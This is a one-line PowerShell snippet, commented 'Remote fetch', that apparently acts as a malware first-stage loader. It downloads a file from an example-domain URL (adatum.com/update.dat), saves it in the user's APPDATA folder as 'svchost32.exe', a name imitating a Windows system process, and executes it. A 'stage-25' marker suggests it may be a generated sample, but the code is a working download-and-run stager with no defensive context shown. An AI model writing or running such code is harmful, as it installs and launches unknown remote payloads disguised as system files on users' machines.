
<# Remote fetch #> $Stage1Url = 'http://adatum.com:80/update.dat'; $DownloadPath = "$env:APPDATA\svchost32.exe"; Invoke-WebRequest -Uri $Stage1Url -OutFile $DownloadPath -UseBasicParsing; Start-Process -FilePath $DownloadPath; $StageMarker = "stage-25"
